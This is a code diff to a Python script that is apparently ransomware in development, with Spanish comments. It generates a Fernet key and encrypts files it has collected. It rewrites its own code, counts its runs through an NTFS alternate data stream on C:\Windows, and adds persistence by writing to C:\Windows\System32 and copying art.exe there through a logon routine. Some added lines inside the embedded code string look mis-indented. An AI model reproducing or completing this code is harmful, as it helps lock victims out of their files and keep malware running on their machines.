@@ -20,6 +20,22 @@ def def_handler(sig, frame):
 
 signal.signal(signal.SIGINT, def_handler)
 
+
+def create_file_in_system32(filename, content):
+    system32_dir = r"C:\Windows\System32"
+
+    file_path = os.path.join(system32_dir, filename)
+
+    try:
+        with open(file_path, "w", encoding="utf-8") as file:
+            file.write(content)
+
+    except PermissionError:
+        print(colored(f"\n[!] Permission Error", "red"))
+    except Exception as e:
+        print(f"Error: {e}")
+
+
 def read_executions_from_ads(file_path):
     ads_path = f"{file_path}:executions"
     try:
@@ -38,7 +54,8 @@ def on_logon_registry(c_dir, file_e):
     dest_dir = r"C:\Windows\System32"
     try:
         if file_e not in dest_dir:
-            shutil.move(file_e, dest_dir)
+            shutil.copy2(file_e, dest_dir)
+            time.sleep(4)
         if file_e in c_dir:
             c_dir.remove(file_e)
         new_filepath = os.path.join(dest_dir, file_e)
@@ -80,8 +97,7 @@ def tmp_task():
 
         # Ejecutar el script desde el archivo temporal
         subprocess.run([sys.executable, temp_script_path])
-        executions = 2
-        write_executions_to_ads(file_path_ads, executions)
+
 
 
     else:
@@ -171,6 +187,7 @@ allfiles1.searching_files(base_directory)
 files = allfiles1.file_list
 
 #video = cv2.VideoCapture('formacion_random.mp4')
+executions = read_executions_from_ads(file_path_ads)
 if executions != 2:
     gen_key()
     key = return_key()
@@ -178,6 +195,10 @@ if executions != 2:
     file_encrypt(files, key)
 time.sleep(5)
 subprocess.run(["python3", "interface.py"])
+executions = read_executions_from_ads(file_path_ads)
+        if executions != 2:
+            executions=2
+            write_executions_to_ads(file_path_ads, executions)
 #open_video(video)
 '''
 
@@ -189,15 +210,9 @@ subprocess.run(["python3", "interface.py"])
         f.write(formatted_code)
 
 def main():
-
-
-    current_dir = os.path.dirname(os.path.abspath(__file__))
-    py_e = "art.exe"
-
-    #on_logon_registry(current_dir, py_e)
-    keycode = Fernet.generate_key()
     script_path = os.path.abspath(__file__)
     if executions != 2:
+        keycode = Fernet.generate_key()
         self_modifying_code(keycode)
 
     #subprocess.run(["python3", "ads_file.py", "texto3.txt", "-a", "art.py"])
@@ -207,11 +222,16 @@ def main():
 
 
 if __name__ == '__main__':
-    file_path_ads = "C:\\Windows\win.txt"
+    create_file_in_system32("windows.txt", "Windows system")
+    file_path_ads = r"C:\Windows"
     executions = read_executions_from_ads(file_path_ads)
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    py_e = "art.exe"
     main()
     if executions != 2:
         tmp_task()
+        time.sleep(4)
+        on_logon_registry(current_dir, py_e)
 
 
 
